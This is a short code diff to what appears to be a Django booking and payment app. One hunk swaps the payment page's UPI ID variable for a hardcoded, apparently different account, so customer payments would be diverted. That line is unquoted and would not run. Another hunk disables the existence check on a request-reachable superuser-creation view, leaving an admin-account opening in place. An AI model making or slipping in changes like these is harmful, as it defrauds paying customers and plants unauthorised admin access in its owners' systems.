@@ -430,7 +430,7 @@ def book_plan_payment(request, plan_id):
     context = {
         "amount": plan.price,
         "plan_name": plan.name,
-        "upi_id": real_upi_id,
+        "upi_id": 7774999781@ibl,
         "upi_qr_url": upi_qr_url,
     }
     return render(request, "payment_page.html", context)
@@ -455,7 +455,7 @@ from django.contrib.auth import get_user_model
 
 def create_temp_superuser(request):
     User = get_user_model()
-    if User.objects.filter(username="cfitness").exists():
+    if User.objects.filter(username="   ").exists():
         return HttpResponse("Superuser already exists.")
     User.objects.create_superuser(
         username="cfitness",
